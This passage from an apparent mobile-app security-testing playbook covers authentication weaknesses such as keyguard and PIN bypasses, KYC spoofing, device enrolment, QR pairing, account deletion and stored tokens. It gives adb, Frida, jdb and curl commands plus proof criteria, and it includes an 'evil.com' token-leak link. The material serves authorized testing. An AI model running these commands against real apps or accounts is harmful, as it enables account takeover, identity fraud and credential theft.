- **Ruled out when:** `setConfirmationRequired` is left at its default `true` (or explicitly `true`) on every sensitive path, and the validity duration is `0` so every operation re-authenticates. MASTG is explicit that `setConfirmationRequired(false)` "is not inherently a vulnerability… may be appropriate for low-risk operations" — escalate only for payments or data release, and scale the duration finding by the window (seconds = acceptable; minutes or hours = High).

### D13-079 · `requestDismissKeyguard()` or `isKeyguardLocked()` treated as authentication

| | |
|---|---|
| **Severity ceiling** | High when the gate protects account data or a transaction |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where it releases the session; otherwise rated on the protected screen |
| **Attacker** | AM-10, AM-11 |
| **Applies to** | All |
| **Maps to** | `KeyguardManager.requestDismissKeyguard` javadoc (the request succeeds only if the activity "must either be visible by using `android.R.attr#showWhenLocked` or `Activity#setShowWhenLocked(boolean)`" — a *visibility* API, not an authentication API); `isKeyguardLocked` javadoc ("This method does not distinguish a lock screen that is requiring authentication … from a lock screen that is trivially dismissible (e.g. with swipe)"); MASTG-TEST-0247, MASTG-TEST-0249, MASTG-TEST-0012 (deprecated v1); MASWE-0017; rule `mastg-android-device-passcode-present`; AOSP security-model paper §4.2.1 on tertiary modalities |

- **Test:** Apps sometimes gate a sensitive screen on "the keyguard was dismissed" or "the device is secure" rather than on a `BiometricPrompt` result or an auth-bound key. On a swipe-only or no-lock device the keyguard dismisses with **no credential at all**, so the gate passes for anyone holding the phone. The same weakness covers tertiary modalities: Smart Lock / trusted place / trusted device hold a device unlocked for extended periods and cannot release auth-bound keys.
- **How:**
```bash
grep -rnE 'requestDismissKeyguard|KeyguardDismissCallback|onDismissSucceeded|FLAG_DISMISS_KEYGUARD' jadx_out/sources/ -A12
grep -rnE 'isDeviceSecure\(|isKeyguardSecure\(|isKeyguardLocked\(|isDeviceLocked\(|canAuthenticate\(' jadx_out/sources/
semgrep -c rules/mastg-android-device-passcode-present.yml jadx_out/sources/
# set the device to swipe-only, then reach the screen
adb shell locksettings clear --old <pin>
adb shell locksettings set-disabled false
```
Then hook the gate to show it is the sole check:
```js
Java.perform(function () {
  var KM = Java.use('android.app.KeyguardManager');
  KM.isDeviceSecure.overload().implementation = function () { console.log('[kg] forced true'); return true; };
});
```
- **Proof:** `onDismissSucceeded` firing (Frida hook or logcat) on a device with **no** credential, followed by the protected screen rendering real data. Or, with an extend-unlock mechanism active, the protected flow completing with no authentication event in the session at all.
- **Escalation:** Chains directly with D04 `showWhenLocked` (the activity has to be lock-screen-visible for the dismiss to succeed at all) and with D11/D12 once the gate releases key material.
- **Ruled out when:** The gate is a `BiometricPrompt` result bound to a `CryptoObject`, or the app's own secret is wrapped by a key with `setUserAuthenticationRequired(true)` — so a dismissed keyguard on a credential-less device releases nothing. Note the severity honesty: "the app does not check for a device passcode" is Informational-to-Low standalone under most rating schemes, and MASTG observes apps "cannot force users to enable biometrics at the system level". Report the **bypass**, showing the check exists, is the sole gate, and is trivially hooked or trivially satisfied.

### D13-080 · Local PIN / passcode gate as client-side UI state

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where it releases the session token; `lack_of_binary_hardening.runtime_instrumentation_based` (P5) if the bypass needs instrumentation and nothing else is wrong |
| **Attacker** | AM-11, AM-12 for the measurement |
| **Applies to** | All apps offering an in-app lock |
| **Maps to** | H1 #50884, #331489 (Nextcloud), #490946, #747726, #1242212 (MEW Wallet PIN bypass, Android), #637194; "Android pin bypass with rate limiting"; CVE-2024-26131 (Element Android — WebView manipulation, PIN bypass, login hijack); MHL labs `lab-secure-notes`, `lab-tidelock-ctf` |

- **Test:** App-level PIN and pattern locks are almost always client-side UI state. Four approaches, cheapest first: launch the post-lock activity directly; kill and restart the process at the right moment; clear the lock flag in prefs; rotate the device. Then brute-force the PIN where the attempt counter is stored locally and resets on process restart.
- **How:**
```bash
adb shell am start -n com.target.app/.MainActivity          # skip LockActivity entirely
adb shell "run-as com.target.app cat shared_prefs/*.xml | grep -iE 'pin|lock|passcode|attempts'"
adb shell "run-as com.target.app sed -i 's/name=\"lock_enabled\" value=\"true\"/name=\"lock_enabled\" value=\"false\"/' shared_prefs/settings.xml"
adb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1
```
Where the validator is a method, read both arguments rather than only forcing the return:
```js
Java.perform(function () {
  var V = Java.use('com.target.app.auth.PinValidator');
  V.verify.overload('java.lang.String').implementation = function (pin) {
    var r = this.verify(pin); console.log('[verify] pin=' + pin + ' -> ' + r); return r;
  };
});
```
On a debuggable or repacked-debuggable build, `jdb` with the **set → print → next → set again** rhythm, because the instruction computing the real result often runs *after* your first assignment:
```
stop in com.target.app.LoginActivity.validate
run
locals
print success
set success = true
next            <-- STEP, then re-check
print success   <-- the real assignment often runs AFTER your write; set it again past that instruction
set success = true
cont
```
- **Proof:** Screen recording: locked app → authenticated content without entering the PIN; or a successful brute force with the counter observably reset; or `print` showing the value holding past the computing instruction. Where the validator leaks it, the expected PIN or hash printed directly.
- **Escalation:** Combined with D11 it yields the session token → D13-010 → D15 ATO. If the server re-checks, the finding is client-side only — state that and move to D15.
- **Ruled out when:** The protected data is genuinely derived from the PIN (a KDF over the PIN unwraps it), so forcing the gate surfaces the UI and the content stays ciphertext; the attempt counter is server-side or survives process restart; and the post-lock activity is not launchable directly. Say which of the two outcomes you have — "the gate protects data" versus "the gate protects a screen" — because the second is Low and the first is High.

### D13-081 · Client-side identity or liveness decision (KYC face match)

| | |
|---|---|
| **Severity ceiling** | High–Critical for a financial/KYC app |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where it yields a verified identity |
| **Attacker** | AM-12 for the forge, AM-01 for the fraud |
| **Applies to** | Apps performing client-side identity or liveness decisions |
| **Maps to** | MHL lab `lab-kyc-me-if-you-can` — "Bypass ML-based face recognition inside a KYC identity verification app" (Android, advanced; tags Biometric Bypass, AI Security) |

- **Test:** A KYC or liveness check implemented client-side is a classification decision you can influence three ways: inject camera frames, hook the classifier's result method, or replace the model asset.
- **How:**
```bash
# locate the model and the decision boundary
unzip -l base.apk | grep -iE '\.tflite|\.onnx|\.pb$|\.mlmodel|assets/.*model'
grep -rnE 'Interpreter|tflite|FaceDetector|liveness|livenessScore|matchScore|threshold|confidence' jadx_out/sources
# hook the classifier's verdict
frida -U -f com.target.app -l hook_liveness.js --no-pause
# or feed the camera pipeline a prepared image (virtual camera / Camera2 hook)
```
- **Proof:** Identity verification passing for an image that is not the enrolled subject — recorded end to end — **and** the server accepting the resulting verified state (check `/me` for `kyc_status` flipping).
- **Escalation:** → D23 (fraud, payouts, limit raises) → D15. This is identity-fraud enablement, not a UI bug; frame it that way.
- **Ruled out when:** The frames or the liveness challenge are uploaded and adjudicated **server-side**, and a hooked client verdict does not change `kyc_status`. Check the server's own response rather than the app's screen: a client that renders "verified" while the backend still says `pending` is a cosmetic bypass.

### D13-082 · Cross-platform apps: the gate lives in JS/Dart, and OTA can re-enable it

| | |
|---|---|
| **Severity ceiling** | High (local auth bypass); Critical (OTA-delivered auth bypass) |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-11 for the local flip; AM-09 (malicious backend/CDN) for the OTA variant |
| **Applies to** | React Native, Flutter, Capacitor, Unity; the OTA half applies to CodePush / expo-updates |
| **Maps to** | expo `UpdatesConfiguration.kt` (`CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS`); CodePush `CodePush.java` (`mPublicKey` unset ⇒ no bundle JWT verification) |

- **Test:** In cross-platform apps the "unlock" decision frequently lives in JS or Dart and only *then* fetches the secret — no cryptographic object is bound to the prompt, so the gate is a branch you can flip. Worse: if the app can be updated over the air and that channel is unauthenticated, all client-side auth logic is attacker-mutable.
- **How:**
```bash
# React Native
grep -aiE 'biometric|TouchID|FaceID|isSensorAvailable|simplePrompt|LocalAuthentication|authenticate' \
  ext/assets/index.android.bundle
hermes-decomp xref ext/assets/index.android.bundle --query 'authenticate'
# Flutter
grep -nE 'local_auth|authenticate|BiometricType|canCheckBiometrics' out_dir/asm/*.txt out_dir/pp.txt | head
# OTA posture (D17)
grep -rnE 'CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS|expo-updates|CodePush|mPublicKey|deploymentKey' \
  jadx_out/sources out/AndroidManifest.xml out/res/values/strings.xml
```
Then flip it: patch the bundle, or hook the native module's promise resolve so the auth call returns `{success:true}`.
- **Proof:** Returning `true` / `{success:true}` from the auth call unlocks the protected screen **and the protected data renders**. For the OTA variant: a victim device, with no reinstall, reaching the authenticated UI after fetching an attacker-served bundle whose login screen calls `onAuthSuccess()` unconditionally.
- **Escalation:** → D19 (the framework's own surface), D17 (the OTA substitution primitive), D11 (proving the released data is real user data).
- **Ruled out when:** The prompt is bound to a native `CryptoObject` (the JS layer only *displays* the result of a native key operation), **and** the OTA channel enforces signature verification (`mPublicKey` set for CodePush; unsigned manifests disallowed for expo-updates). Show the chain for the OTA variant, not just the channel — an unsigned update channel with no auth logic in the bundle is a D17 finding, not a D13 one.

### D13-083 · Device registration / enrolment endpoint: forge, re-point or cross-enrol

| | |
|---|---|
| **Severity ceiling** | Critical (the enrolled device becomes an authentication factor or receives the victim's notifications); High (notification content only) |
| **VRT** | `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (**P2**); `broken_authentication_and_session_management.authentication_bypass` (P1) once the enrolled device satisfies MFA |
| **Attacker** | AM-01, AM-05 |
| **Applies to** | All apps with push, device management, or "trusted device" MFA |
| **Maps to** | API1:2023 (the device record is an object with an owner); API2:2023 |

- **Test:** Mobile apps register a device — push token, device id, attestation blob, hardware key — against the account. Four cases: forge the binding, re-point it, enrol onto someone else's account, and omit the attestation entirely.
- **How:** Find the enrolment call (`/devices`, `/register`, `/enroll`, `/fcm/token`), then:
```bash
# 1. baseline: register a device id of your choosing against YOUR account
# 2. register a device you control against account B's user id
curl -s -X POST https://api.target/v1/devices -H "Authorization: Bearer $TOKEN_A" \
  -H 'Content-Type: application/json' \
  -d '{"userId":"'"$B_ID"'","deviceId":"attacker-device","pushToken":"'"$MY_FCM"'","platform":"android"}' -i
# 3. re-register account A's EXISTING device id from a different session (takeover of the binding)
# 4. omit / blank / forge the attestation field
```
- **Proof:** A 201/200 for case 2 or 3, followed by an **observable consequence** — your device receiving push notifications intended for account B, or account B's next MFA challenge arriving on your device. The status code alone is not the finding.
- **Escalation:** Enrolled device → receives OTP or push-approval → full ATO without ever touching the victim's phone. → D24 (push), D13-069 (trusted device).
- **Ruled out when:** The endpoint derives the owner from the authenticated principal and ignores a client-supplied `userId`, re-registration of an existing device id from a foreign session is refused, and the attestation blob is verified server-side (D13-017). Test all four; implementations commonly scope the create and forget the update.

### D13-084 · Multi-device linking and "scan to log in" QR pairing

| | |
|---|---|
| **Severity ceiling** | Critical (E2EE messenger: silent key addition defeats the product's core claim; wallet/chat: one-scan full ATO) |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-02 (the phish), AM-01 (the poll) |
| **Applies to** | Apps with a web/TV/desktop companion, multi-device support, or E2EE messaging |
| **Maps to** | ATT&CK **T1676 Linked Devices** (new in ATT&CK v18; "Adversaries may use Phishing techniques to trick the user into scanning a quick-response (QR) code, which is used to link the user's Signal and/or WhatsApp account to an adversary-controlled device"; the QR codes "masquerade as group invites, security alerts, or pairing instructions"; Sandworm Team and Star Blizzard cited); T1660 Phishing (quishing) |

- **Test:** Three failure modes in the pairing flow, plus three in the linking flow. **Pairing:** the QR payload is guessable or enumerable; the approval endpoint does not bind the approval to the scanning device or to a freshly-proved user presence; the pending session is issued *before* the user confirms. **Linking:** does linking require a step-up at the moment of linking; are existing devices notified; does an E2EE product surface the new device's key fingerprint?
- **How:**
```bash
grep -rnE 'loginToken|device_code|user_code|pairing|approveSession|qr_login|link_device|authorize_device|polling' jadx_out/sources
grep -rnE 'linkDevice|pairDevice|addDevice|device_key|identity_key|safety_number|fingerprint|sender_key|prekey' jadx_out/sources
zbarimg pairing.png                     # decode what the companion surface displays
# a) approve a token you GENERATED, not one you scanned
curl -s -X POST https://api.target/v1/auth/qr/approve -H "Authorization: Bearer $VICTIM_APP_TOKEN" \
  -d '{"code":"<attacker-generated or guessed>"}' -i
# b) poll with the attacker's code from anywhere
curl -s "https://api.target/v1/auth/qr/poll?code=<code>" -i
# c) add a device with only a bearer token
curl -s -X POST https://api.target/v1/devices -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"attacker","pubkey":"..."}' -i
curl -s https://api.target/v1/devices -H "Authorization: Bearer $VICTIM" | jq
```
- **Proof:** The attacker's polling endpoint returning a full session token for the victim's account after the victim scanned or approved an **attacker-supplied** code — show the resulting `/me`. Or a device added with only a bearer token, no step-up prompt on the primary device, no notification, and that device subsequently receiving messages or transactions. Screenshot the victim account's linked-device list showing your device.
- **Escalation:** Persistence — the link survives a password change unless explicitly revoked; test that. Pair with D09: if the pairing screen itself is reachable via a deep link, the phish is one click. A printed QR delivers the attacker's code with no digital channel at all.
- **Ruled out when:** The pairing code is high-entropy and single-use, the approval is bound to the scanning device and to a fresh authentication, the session is issued only after explicit confirmation, linking requires a step-up, existing devices are notified out of band, and the linked-device list is visible and revocable. Those are the controls to demand; enumerate which are present.

### D13-085 · Lock-screen notification action performs an authenticated action

| | |
|---|---|
| **Severity ceiling** | High (2FA approval, transfer confirmation, or a message sent as the user); Medium (content disclosure only) |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where a locked device approves a login |
| **Attacker** | AM-10 (physical, locked) |
| **Applies to** | All. **State the device's lock-screen notification setting in the report, because the vendor will ask** |
| **Maps to** | ATT&CK T1517 Access Notifications; MASWE-0037; MASTG-TEST-0315; `Settings.Secure.lock_screen_allow_remote_input` |

- **Test:** The corpus covers notification *content* on the lock screen and `RemoteInput` PendingIntent mutability separately. The untested combination is whether a person can **act** with the phone locked — reply to a message as the victim, approve a login, accept a transfer, mark a 2FA prompt as "yes it's me" — using only the notification's own buttons.
- **How:**
```bash
adb shell input keyevent 26                       # lock
# trigger the notification (send the victim a message / start a login on another device)
adb shell input keyevent 224; adb exec-out screencap -p > lock.png
adb shell input tap <x> <y>; adb shell input text "sent-from-lockscreen"
adb shell dumpsys notification --noredact | grep -A20 'com.target.app' \
  | grep -iE 'RemoteInput|actions|visibility|VISIBILITY_'
adb shell settings get secure lock_screen_allow_remote_input
grep -rnE 'setVisibility\(|VISIBILITY_SECRET|VISIBILITY_PRIVATE|setPublicVersion|addAction\(|RemoteInput\.Builder' jadx_out/sources
```
- **Proof:** The reply delivered or the login approved, on video with the lock screen visible throughout, and the recipient side showing the message attributed to the victim. Record `lock_screen_allow_remote_input` alongside it.
- **Escalation:** A lock-screen-approvable 2FA prompt turns a stolen locked phone into an ATO → D13-064. → D24 for the push-payload side.
- **Ruled out when:** Sensitive notifications set `VISIBILITY_SECRET` with a redacted `setPublicVersion`, and any action that mutates state requires device unlock (the `PendingIntent` launches an activity that demands authentication rather than performing the action directly). Distinguish the two halves: content disclosure on the lock screen is the lesser finding; *acting* while locked is the report.

### D13-086 · Account deletion without re-authentication, or reachable from an exported surface

| | |
|---|---|
| **Severity ceiling** | High (destructive action reachable from any stolen token or any installed app); Critical if reachable pre-auth or cross-user |
| **VRT** | `server_security_misconfiguration.lack_of_password_confirmation.delete_account` (**P4**); `broken_access_control.exposed_sensitive_android_intent` (VARIES) for the exported-surface variant |
| **Attacker** | AM-03 (exported activity / deep link), AM-01 (stolen token), AM-02 (a one-tap link in a chat) |
| **Applies to** | All apps offering in-app account deletion — a Play requirement for apps with accounts |
| **Maps to** | ATT&CK T1640 Account Access Removal, T1629.002 Device Lockout, T1642 Endpoint Denial of Service |

- **Test:** Deletion is the most destructive action in the app and is often a plain authenticated `DELETE` behind a confirmation dialog only. Two questions: does the API require a password, biometric or OTP; and is the deletion activity or in-app route reachable from **outside** — an exported activity, a deep link, a notification `PendingIntent`, or a WebView `loadUrl` to an internal route?
- **How:**
```bash
grep -rnE 'deleteAccount|closeAccount|DELETE.*\/(me|account|users)|DeactivateActivity|ConfirmDeletionActivity' jadx_out/sources
grep -nE 'android:exported="true"' -B4 out/AndroidManifest.xml | grep -iE 'delete|deactivate|close'
adb shell am start -n com.target.app/.settings.DeleteAccountActivity --ez confirmed true
adb shell am start -a android.intent.action.VIEW -d 'target://settings/delete-account?confirm=1'
curl -s -X DELETE https://api.target/v1/me -H "Authorization: Bearer $TOKEN" -i   # no password field
```
- **Proof:** 200/204 on the deletion call with only a session token, or the deletion activity completing from an `am start` or a deep link — then `GET /me` returning 401/404 and the account no longer logging in. **Record the whole sequence; deletion is unrecoverable, so run it only against a throwaway account you own.**
- **Escalation:** A one-tap deletion deep link posted in a chat is a wormable griefing primitive (→ D09). Where the app holds device admin (D03), the adjacent primitive is `DevicePolicyManager.lockNow()`, which is the Critical variant of the same "remove the user's access" pattern.
- **Ruled out when:** Deletion requires a step-up the server validates, the activity is not exported and not deep-link-reachable, and no `confirmed=true`-style parameter short-circuits the confirmation. Check the exported surface separately from the API — an app that guards the API correctly can still ship an exported confirmation activity.

### D13-087 · Deletion that does not revoke tokens, grants, push registrations or identities

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.failure_to_invalidate_session.all_sessions` (P5) for the bare token; `authentication_bypass` (P1) where the refresh token still mints or a social re-login resurrects the account |
| **Attacker** | AM-01 |
| **Applies to** | All |
| **Maps to** | `hunt-idor` Chain 5 (soft-delete plus post-removal token validity); ATT&CK T1640 |

- **Test:** After deletion, check what **still** authenticates: the access token, the refresh token, the FCM registration token, third-party OAuth grants the user made through the app, linked social identities, saved payment instruments at the PSP, and the support-chat identity.
- **How:**
```bash
# capture everything BEFORE deleting, then replay after
for E in /v1/me /v1/orders /v1/cards /v1/sessions /v1/devices; do
  printf '%-14s ' "$E"
  curl -s -o /dev/null -w '[%{http_code}]\n' "https://api.target$E" -H "Authorization: Bearer $ACCESS"
done
curl -s -X POST https://api.target/v1/oauth/token \
  -d "grant_type=refresh_token&refresh_token=$REFRESH" -i
# push still delivers?  re-login via the social provider — same user_id?
```
- **Proof:** Any 200 after deletion. The most damning are a refresh token that still mints access tokens, and a re-login via the social provider returning the **same** `user_id` with the old data intact — soft-delete resurrection, which is both a security and a regulatory finding with a demonstrable artefact.
- **Escalation:** Combine with D13-060 — a deleted identifier that can be re-registered and re-merged is a takeover of the previous owner's residual data.
- **Ruled out when:** Every captured credential is refused after deletion, the refresh token is dead, push no longer delivers, and a social re-login creates a **new** `user_id` with no prior data. Test the social path specifically; token revocation is usually correct and identity resurrection usually is not.

### D13-088 · Support-chat identity verification disabled or computed on-device

| | |
|---|---|
| **Severity ceiling** | High (cross-user disclosure of support conversations); Critical where the support thread is also a recovery channel |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) → `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES); `authentication_bypass` (P1) where support-agent resets follow |
| **Attacker** | AM-01, AM-05 |
| **Applies to** | All apps embedding Intercom / Zendesk Messaging / Freshchat / Helpshift |
| **Maps to** | `developers.intercom.com/installing-intercom/android/identity-verification` — `Intercom.client().setUserHash(...)`, HMAC-SHA256 over the user id or email, secret kept "in a secure place on your app server", 401 on failure; public reporting of an SDK minting JWTs from "hardcoded secrets with sequential account IDs" enumerable "without triggering rate limiting or account lockout" |

- **Test:** Support SDKs authenticate the end user with an HMAC or JWT the vendor requires to be produced **server-side**. If identity verification is off, or the secret ships in the APK so the client can compute it, any user can register as any other user and read their entire support history — which routinely contains order numbers, addresses, partial card data and account-recovery correspondence.
- **How:**
```bash
grep -rnE 'setUserHash|Intercom\.client\(\)|registerIdentifiedUser|Zendesk.*loginUser|jwtToken|authenticat(e|ion)Token|Freshchat.*restoreId|identity_verification' jadx_out/sources
grep -rnE '[A-Za-z0-9_-]{32,}' out/res/values/strings.xml | grep -iE 'intercom|zendesk|freshchat|helpshift'
grep -rn 'Jwts\.builder\|SignatureAlgorithm\.HS256\|HmacSHA256\|io/jsonwebtoken\|setIdentity' jadx_out/sources
# then, in Burp, replay registration with a different user id and no/forged hash
```
If a hash is present, test whether it is server-issued: change the device's user id and see whether the app still produces a valid hash **offline** — it can only do so if the secret is local.
- **Proof:** The support SDK returning another user's conversation list or history after registering with that user's id — screenshot of the loaded conversation plus the request showing the substituted id. With identity verification enabled and server-side, the vendor returns **401** instead.
- **Escalation:** Combine with the support-WebView item in D10 and with D15 support-ticket IDOR. Where agents perform password resets from the thread, this is a social-engineering path to full ATO.
- **Ruled out when:** Registration without a valid hash returns 401, and changing the user id on-device cannot produce a valid hash (no secret in the binary, no offline HMAC). If you do find a secret, verify the current SDK behaviour yourself before asserting it in a report, and do not cite a CVE where none was assigned.

### D13-089 · Autofill and Credential Manager leaking credentials into a WebView or an unverified package

| | |
|---|---|
| **Severity ceiling** | Critical (an autofill *service* filling credentials into an unverified package); High (a client leaking a CVC/OTP field into a WebView) |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1); `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) |
| **Attacker** | AM-03, AM-08 |
| **Applies to** | Autofill framework from **Android 8.0 (API 26)**; the service side requires `BIND_AUTOFILL_SERVICE` |
| **Maps to** | `guide/topics/text/autofill-services` — "Verify package identity before sending data to untrusted packages"; "Data partitioning: organize data into logical groups (credentials, address, payment) and avoid exposing data from multiple partitions in a single dataset"; the explicit warning that filling into WebView fields is risky "as compromised web content could capture autofilled data"; `android:importantForAutofill` values `auto`/`yes`/`no`/`yesExcludeDescendants`/`noExcludeDescendants`; MASWE-0019 (Lack of Auto-fill Support for Credential Providers, CWE-287/522), MASVS-AUTH-1 |

- **Test:** Two sides. **Client:** a password, OTP or CVC field left at `importantForAutofill="auto"` participates in autofill, and if it is hosted in a WebView the filled value is reachable by the loaded content. **Service** (when the target *is* an autofill or credential provider): does it verify the requesting package's signing identity before returning a dataset, and does it partition credentials from payment data?
- **How:**
```bash
grep -rn 'importantForAutofill\|setAutofillHints\|autofillHints\|AUTOFILL_HINT_' jadx_out/sources/ out/res/layout/
grep -rn 'BIND_AUTOFILL_SERVICE\|android.service.autofill.AutofillService' out/AndroidManifest.xml
grep -rn 'CredentialManager\|GetCredentialRequest\|allowedProviders\|preferImmediatelyAvailableCredentials' jadx_out/sources
grep -rn 'setAllowFileAccess\|loadUrl(\|shouldOverrideUrlLoading\|setJavaScriptEnabled' jadx_out/sources
```
Then, for the Credential Manager variant, navigate the WebView to an off-origin URL — via a deep link, an open redirect in the loaded site, or a bridge method — and attempt the credential flow.
- **Proof:** Three variants. *(client)* A password/OTP/CVC field autofilled into a WebView-hosted form, shown by triggering the autofill picker over that field and capturing the fill. *(Credential Manager)* The credential sheet appearing for the legitimate RP while the WebView sits on an attacker-controlled origin — evidence it with `WebView.getUrl()` hooked in Frida. *(service)* A dataset containing credentials returned to a stub app that merely declares a matching field, with no signature check on the requesting package.
- **Escalation:** → D10 (the WebView and its bridge) → D13-072 (passkey origin binding) → credential theft.
- **Ruled out when:** Sensitive fields are `importantForAutofill="no"` or `noExcludeDescendants`, no credential flow is initiated from a WebView whose origin the app does not control, and (for a service) the dataset is withheld until `checkSignatures()`-style package verification passes. Note the severity honesty on the *absence* of autofill support: "the login form does not support password managers" is Informational-to-Low on its own; report it only when it forces the credential through the clipboard, and chain it to the clipboard item in D20.

### D13-090 · Credential or long-lived token stored on device instead of a short-lived service token

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) once replayed off-device; `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (**P5**) if you stop at the storage observation |
| **Attacker** | AM-03/AM-04 (via a D07/D08/D11 primitive), AM-11, AM-12 for the measurement |
| **Applies to** | All |
| **Maps to** | Android developer security-tips, Credentials section (verbatim): "If you must use traditional password authentication, don't store user IDs and passwords on the device. Instead, perform initial authentication using the username and password supplied by the user, and then use a short-lived, service-specific authorization token"; and "Before passing credentials to an `Account` retrieved with `AccountManager`, verify the signing identity of the calling application so that you don't inadvertently pass credentials to a malicious or unauthorized app"; MASWE-0024; Indusface "Remember Me Functionality" |

- **Test:** What is actually at rest — a password, a long-lived refresh token, an `AccountManager` credential, or a short-lived service token? And does the app verify the caller's signing identity before handing a credential out of `AccountManager`?
- **How:**
```bash
adb shell run-as com.target.app grep -rlniE 'password|refresh_token|client_secret|remember|device_token|eyJ[A-Za-z0-9_-]{10,}' shared_prefs databases files 2>/dev/null
adb shell run-as com.target.app cat shared_prefs/*.xml
grep -rn 'AccountManager\|addAccountExplicitly\|getPassword\|peekAuthToken\|getAuthToken\|setPassword\|checkSignatures' jadx_out/sources
```
Trace one token end to end so the report is a chain of identical strings rather than an assertion:
```bash
frida-trace -U -p $(adb shell pidof -s com.target.app) -j '*!*token*/iu' -o token.log
```
```js
Java.perform(function () {
  // hook the CONCRETE class: android.content.SharedPreferences$Editor is an interface and records nothing
  var E = Java.use('android.app.SharedPreferencesImpl$EditorImpl');
  E.putString.implementation = function (k, v) {
    console.log('[prefs.putString] ' + k + ' = ' + v); return this.putString(k, v);
  };
});
```
Then replay from a different device, IP and User-Agent:
```bash
curl -i -X POST https://api.target/v1/token/refresh -d "refresh_token=$VALUE"
curl -i -H "Authorization: Bearer $VALUE" https://api.target/v1/me
```
- **Proof:** The identical string appearing in the network response (Burp), in `putString` (Frida), in `shared_prefs/auth.xml` (objection `filesystem cat`), and — where applicable — in a log line or an implicit broadcast; **then** a new access token issued to a different device using the extracted refresh token. That final replay is what moves the report out of the P5 storage band into P1.
- **Escalation:** → D11 (the storage primitive), D02 (backup extraction), D07/D08 (the cross-app retrieval vector), D13-020 (does it rotate?), D13-019 (does it survive a password change?).
- **Ruled out when:** Only a short-lived, service-specific token is at rest; no password, no `client_secret`, and no non-rotating refresh token; `AccountManager` callers are checked with `checkSignatures()`; and the stored token is refused when replayed from a different device after the local session ends. Apply the D13-010 artefact exclusions before concluding the replay failed for binding reasons.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "Session not invalidated on logout" (server-side only) | `failure_to_invalidate_session.on_logout_server_side_only` is **P5**, and it is on the never-submit list standalone. Reddit and several other programs exclude it by name. The user has already chosen to end the session. | A theft chain: a token recovered through D07/D08/D10/D11 that still authenticates after logout **and** after the password change (D13-019), replayed from a host that never ran the app. |
| Excessive JWT lifetime / `exp` months out | `excessive_jwt_lifetime` = **P5**. A long-lived token nobody can obtain is a design note. | Pair it with a token-disclosure primitive and file it *inside* that report as the amplifier (D13-028), never separately. |
| Weak JWT hashing algorithm; PII inside the JWT payload | `weak_jwt_hashing_algorithm` = **P5**; `disclosure_of_secrets.sensitive_information_disclosed_jwt` = **P5**. The algorithm being weak is not the same as the signature being forgeable. | A **forged** token the server accepts (D13-027) — cracked secret, `alg:none`, `jwk`/`jku`/`kid`, or RS256→HS256 — demonstrated on an endpoint scoped to another principal. |
| Concurrent logins allowed / no session-count limit | `concurrent_logins` = **P5**. Multi-device is a product decision. | Only if concurrency defeats a documented control — e.g. a licensing or seat limit the vendor sells (→ D23). |
| "No 2FA implementation" / "no account lockout" | `no_two_fa_implementation` = **P5**; `no_account_lockout` = **P5**. Absence of an optional control is a recommendation, not a vulnerability. | Demonstrate the exhaustion the missing control permits and show the resulting session (D13-038/041). |
| OAuth `client_secret` extracted from the APK | On the never-submit list as known and expected — a public client has no confidential secret by definition. | **PKCE non-enforcement** at the token endpoint (D13-030) is the reportable finding; the secret is context. |
| Bare host-header injection (`X-Forwarded-Host` reflected) | On the never-submit list without the downstream PoC. A reflected host is a parser artefact. | The **delivered reset email** containing `https://evil.com/reset?token=…` (D13-054) — `token_leakage_via_host_header_poisoning` = **P2**. |
| Rate-limit bypass with no demonstrated abuse | HackerOne Core Ineligible ("most issues related to rate limiting"); Grab, Reddit and HackenProof all exclude it. The bypass is the primitive; the bug is the abuse case. | Carry it through to the accepted OTP or recovery code and the issued session (D13-038/040), then file as `authentication_bypass`. |
| Username/email enumeration returning only existence | `username_enumeration.non_brute_force` = **P4**, and many programs class it low-risk information. | The response leaking **more than existence** — a real name, avatar, masked phone (→ PII exposure); or file it as the enabling half of a credential-stuffing chain with the stuffing demonstrated. |
| Biometric bypass demonstrated only with Frida on an emulator, with no `CryptoObject` analysis | Lands in `lack_of_binary_hardening.runtime_instrumentation_based` = **P5**, and invites "not a real-world bypass". Google Mobile VRP excludes secondary lockscreen bypasses outright. | The missing `CryptoObject` *plus* the released secret *plus* the server accepting it, demonstrated on a physical device (D13-074). |
| `setDeviceCredentialAllowed(true)` / `DEVICE_CREDENTIAL` in the allowed authenticators | MASTG-TEST-0326 states plainly that this "is not inherently a vulnerability… better categorized as a security weakness or hardening issue". | A finance/health/government vertical where a shoulder-surfed PIN is the realistic attack, **or** a second non-key-bound `createConfirmDeviceCredentialIntent` path (D13-077). |
| `setConfirmationRequired(false)` | MASTG: "not inherently a vulnerability. It may be appropriate for low-risk operations." | A payment or data-release action completing on a passive face match with no deliberate user action (D13-078). |
| "The app does not check for a device passcode" | Informational-to-Low; MASTG notes apps "cannot force users to enable biometrics at the system level". | The **bypass**: show the check exists, is the sole gate, and is trivially hooked or satisfied on a swipe-only device (D13-079). |
| "The login form does not support autofill / password managers" | MASWE-0019 is a usability-driven weakness; no VRT node rates it. | Show it forces the credential through the clipboard, then chain to the clipboard read in D20 (D13-089). |
| Root/emulator detection defeated, so "the biometric gate can be bypassed" | `lack_of_binary_hardening.*` is **P5** across the board. A defeated client-side check is expected on an attacker-controlled device. | Reframe entirely: the finding is that the *server* trusts a client assertion (D13-017), or that the authentication decision was never cryptographically bound (D13-074). |
